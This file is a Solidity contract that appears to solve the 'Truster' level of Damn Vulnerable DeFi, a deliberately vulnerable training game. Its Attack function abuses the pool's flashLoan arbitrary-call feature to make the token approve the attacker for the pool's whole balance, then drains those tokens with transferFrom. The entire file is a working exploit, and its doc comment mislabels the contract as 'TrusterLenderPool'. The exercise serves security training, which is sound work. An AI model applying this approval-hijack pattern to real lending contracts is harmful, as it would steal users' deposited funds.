// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITruster {
    function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data) external;
}

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attacker {

    constructor () {
    }

    function Attack(
        IERC20 DVT,
        ITruster pool,
        address attacker
    )
        external
    {
        uint256 poolBalance = DVT.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, attacker, address(DVT), data);
        DVT.transferFrom(address(pool), attacker, poolBalance);
    }

}
